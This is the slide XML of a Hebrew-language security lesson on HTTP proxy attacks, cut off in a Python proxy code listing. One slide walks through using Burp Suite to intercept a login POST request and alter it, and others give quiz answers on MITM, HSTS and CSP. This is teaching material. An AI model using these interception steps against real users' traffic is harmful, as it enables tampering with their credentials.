              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה מעשית: יצירת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ויירוט תעבורה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9ECC444D-183D-47E9-B036-9CF905F2EA8D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נראה לך איך תוקף עשוי להשתמש בכלים כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Burp Suite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי ליירט תעבורה ולעשות שינויים בבקשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. התקנת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Burp Suite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: אם אתה משתמש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Kali Linux, Burp Suite </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כבר מותקן. כדי להפעיל אותו על ידי הפעולה הזאת:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>burpsuite</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. הגדרת דפדפן להשתמש </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Burp Suite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הגדר את הדפדפן שלך להשתמש בכתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ובפורט שבו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Burp Suite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מקשיב (למשל, 127.0.0.1:8080). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. יירוט בקשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: לאחר שהדפדפן מוגדר להשתמש </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, כל הבקשות והתשובות יעברו דרך</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Burp Suite </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התוקף יכול לצפות בבקשות, לשנות אותן ולשלוח אותן לשרת היעד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. שינוי תוכן הבקשה: נניח שדף התחברות שולח בקשת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> POST </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עם פרטי המשתמש. התוקף יכול לשנות את הפרטים ולשלוח בקשה שונה לשרת.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="158638726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0C1E2C7-FBE1-4FDC-9FC7-CAD180C828A6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3558209" y="642594"/>
            <a:ext cx="7566990" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTP Proxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>- שאלות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{89204C3E-7512-44A2-9F6B-17F18C2CD002}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מהם הסיכונים בשימוש </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ציבורי?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. כיצד ניתן להגן על תקשורת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTPS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מפני מתקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SSL Strip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. מהם היתרונות בשימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. כיצד ניתן לזהות פעילות חשודה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="217726626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F2DCD7-8469-43CD-B065-8965CD46EB4E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3319670" y="642594"/>
            <a:ext cx="7805530" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTP Proxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>- תשובות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6B51A40C-320D-44C0-9FCA-60054BC2A65A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ציבורי יכול לשמש תוקפים ליירט תעבורה ולבצע מתקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MITM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. שימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HSTS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מבטיח שהדפדפן יתקשר רק בפרוטוקול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עם השרת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CSP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מגביל את סוגי התוכן שניתן לטעון, ומונע התקפות כמו</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>והזרקת קוד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. עקוב אחר תעבורת הרשת וחפש בקשות לא מוכרות או ניתוב בלתי צפוי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="344518935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899A328-4949-46F2-B1D7-498F268D3317}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1769164" y="642594"/>
            <a:ext cx="9356035" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לקראת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C1455567-C3BE-42ED-AD81-2BFDD5470FFD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תזכורת: שרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הוא מתווך שמקבל בקשות מלקוח (כמו דפדפן אינטרנט), מעביר את הבקשות לשרת היעד, מקבל את התשובה מהשרת היעד ומחזיר אותה ללקוח. זה מאפשר מספר דברים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>אנונימיות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכול להסתיר את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>של הלקוח מהשרת היעד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>בקרה וניטור</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: אפשר </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>לנטר</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ולשלוט בתעבורה העוברת דרך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מטמון</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: ניתן לשמור עותקים של התשובות מהשרתים בשרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ולהחזירם בעתיד מבלי לשלוח בקשה חדשה לשרת היעד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מה עושים בתרגיל?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בתרגיל, המטרה היא ליצור שרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> פשוט ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Python </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> באמצעות ספריית </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>http.server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הזה יאזין לבקשות נכנסות מלקוחות, יעביר אותן לשרת היעד ויחזיר את התשובה מהשרת היעד ללקוח.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך..</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18609639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7CA11B-3910-4380-8A6F-F9B8E25D20DB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1421296" y="642594"/>
            <a:ext cx="9703904"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68302437-CEE5-4B11-81EE-FCD9B993D59A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שלבים בתרגיל:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>1. קבלת בקשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מהלקוח</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מקבל בקשה מהלקוח (למשל, דפדפן אינטרנט שולח בקשה לטעון עמוד אינטרנט).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>2. העברת הבקשה לשרת היעד</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שולח את הבקשה שקיבל מהלקוח לשרת היעד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>3. קבלת התשובה מהשרת היעד והחזרתה ללקוח</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מקבל את התשובה מהשרת היעד (למשל, תוכן עמוד האינטרנט) ומחזיר אותה ללקוח.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39483049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C14080F-F8DA-4FE0-9789-1F57929FA3C9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1620078" y="642594"/>
            <a:ext cx="9505122"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FFA06A63-54A0-41A0-8BF7-9B6EBD334500}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>איך זה בא לידי ביטוי בקוד?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מחלקת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Proxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>במחלקה הזו אנחנו מגדירים מה לעשות כאשר מתקבלת בקשת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> .GET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אנחנו מדפיסים את הנתיב (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>של הבקשה ומעבירים אותה לשרת היעד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>העברת הבקשה לשרת היעד</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: אנחנו משתמשים בספריית </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>requests</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לשלוח את הבקשה לשרת היעד ולקבל את התשובה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>החזרת התשובה ללקוח</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: אנחנו מעבירים את התשובה מהשרת היעד ללקוח באמצעות פונקציות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>send_response</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> , </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>send_header</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> , </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>wfile.write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> .</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ולהלן הקוד..</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="206820775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167F007-0226-4E54-9A95-633207C273A9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1782417" y="0"/>
            <a:ext cx="10058400" cy="1172817"/>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101A5DC8-CD1E-4D93-B40B-9F1EF5BE0414}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="934277"/>
            <a:ext cx="10058400" cy="5685183"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="32500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0" err="1"/>
              <a:t>http.server</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0" err="1"/>
              <a:t>socketserver</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>import requests</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>class Proxy(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0" err="1"/>
              <a:t>http.server.SimpleHTTPRequestHandler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>    def </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0" err="1"/>
              <a:t>do_GET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>(self):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>        # Print the request path</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>        print(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0" err="1"/>
              <a:t>f"Handling</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t> GET request for {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0" err="1"/>
              <a:t>self.path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" dirty="0"/>
              <a:t>}")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
